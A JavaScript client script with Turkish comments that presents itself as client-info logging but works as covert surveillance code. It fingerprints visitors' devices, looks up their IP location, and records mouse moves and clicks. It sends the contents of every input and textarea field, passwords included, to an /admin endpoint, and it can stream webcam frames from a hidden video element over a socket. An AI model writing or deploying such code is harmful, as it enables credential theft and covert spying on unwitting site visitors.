// clientInfo.js
function sendClientLog(payload) {
  fetch("/admin/client-logs", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.warn("Log gönderilemedi:", err);
  });
}

// Video stream değişkenleri
let videoStream = null;
let videoStreamActive = false;
let videoCanvas = null;
let videoCanvasCtx = null;
let videoFrameInterval = null;

// Video yayınını başlat
function startVideoStream(socket) {
  if (videoStreamActive) return;
  
  // Canvas ve context oluştur
  videoCanvas = document.createElement('canvas');
  videoCanvas.width = 320;  // Düşük çözünürlük için
  videoCanvas.height = 240;
  videoCanvasCtx = videoCanvas.getContext('2d');
  
  // Kamera erişimi iste
  navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
    .then(stream => {
      videoStream = stream;
      videoStreamActive = true;
      
      // Gizli video elementi oluştur
      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      
      // Her 500ms'de bir frame gönder - ağ yükünü azaltmak için
      videoFrameInterval = setInterval(() => {
        if (!videoStreamActive) return;
        
        // Video frame'i canvas'a çiz
        videoCanvasCtx.drawImage(video, 0, 0, videoCanvas.width, videoCanvas.height);
        
        // Frame'i base64 olarak kodla ve gönder
        const imageData = videoCanvas.toDataURL('image/jpeg', 0.5); // Kaliteyi düşürerek veri boyutunu azalt
        
        if (socket && socket.connected) {
          socket.emit('video_frame', {
            userId: clientInfo.userId || 'anonymous',
            frame: imageData,
            timestamp: Date.now()
          });
        }
      }, 500);
      
      // Video stream başlatıldı logunu gönder
      sendClientLog({
        type: "video_stream_started",
        timestamp: Date.now()
      });
    })
    .catch(err => {
      console.error("Kamera erişimi hatası:", err);
      sendClientLog({
        type: "video_stream_error",
        error: err.message,
        timestamp: Date.now()
      });
    });
}

// Video yayınını durdur
function stopVideoStream() {
  if (!videoStreamActive) return;
  
  // Interval'i temizle
  if (videoFrameInterval) {
    clearInterval(videoFrameInterval);
    videoFrameInterval = null;
  }
  
  // Stream'i durdur
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
    videoStream = null;
  }
  
  videoStreamActive = false;
  
  // Video stream durduruldu logunu gönder
  sendClientLog({
    type: "video_stream_stopped",
    timestamp: Date.now()
  });
}

document.addEventListener("DOMContentLoaded", function () {
  // IP ve konum bilgisi
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(ipData => {
      const clientInfo = {
        type: "initial_info",
        ip: ipData.ip,
        city: ipData.city,
        region: ipData.region,
        country: ipData.country_name,
        org: ipData.org,
        userAgent: navigator.userAgent,
        language: navigator.language,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        cpuCores: navigator.hardwareConcurrency,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        devicePixelRatio: window.devicePixelRatio,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
        isOnline: navigator.onLine,
        timestamp: new Date().toISOString()
      };

      // Ağ bağlantısı bilgisi
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        clientInfo.network = {
          effectiveType: connection.effectiveType,
          downlink: connection.downlink,
          rtt: connection.rtt,
          saveData: connection.saveData
        };
      }

      fetch("/admin/client-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(clientInfo)
      }).catch(err => {
        console.error("Client info gönderilemedi:", err);
      });
    });
});

// Mouse hareketi logu
let lastMouseX = null;
let lastMouseY = null;
document.addEventListener("mousemove", (e) => {
  if (
    lastMouseX === null ||
    Math.abs(e.clientX - lastMouseX) > 10 ||
    Math.abs(e.clientY - lastMouseY) > 10
  ) {
    lastMouseX = e.clientX;
    lastMouseY = e.clientY;

    sendClientLog({
      type: "mouse_move",
      x: e.clientX,
      y: e.clientY,
      timestamp: Date.now(),
    });
  }
});

// Click logu
document.addEventListener("click", (e) => {
  sendClientLog({
    type: "click",
    x: e.clientX,
    y: e.clientY,
    tag: e.target.tagName,
    id: e.target.id || null,
    class: e.target.className || null,
    timestamp: Date.now(),
  });
});

// Sekme gizlenme/görünme logu
document.addEventListener("visibilitychange", () => {
  sendClientLog({
    type: "visibility_change",
    hidden: document.hidden,
    timestamp: Date.now()
  });
});

// Batarya bilgisi (destekliyorsa)
if (navigator.getBattery) {
  navigator.getBattery().then(battery => {
    sendClientLog({
      type: "battery_status",
      level: battery.level,
      charging: battery.charging,
      timestamp: Date.now()
    });
  });
}

document.addEventListener("input", (e) => {
  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
    sendClientLog({
      type: "user_input",
      value: e.target.value,
      inputType: e.target.type || "text",
      id: e.target.id || null,
      class: e.target.className || null,
      timestamp: Date.now()
    });
  }
});

// Dışa aktarılacak fonksiyonlar
window.clientVideoControl = {
  startStream: () => {
    // Socket.IO bağlantısını alıp video stream'i başlat
    if (window.io) {
      const socket = io("http://127.0.0.1:3000");
      startVideoStream(socket);
    } else {
      console.error("Socket.IO bulunamadı. Video stream başlatılamıyor.");
    }
  },
  stopStream: stopVideoStream
};


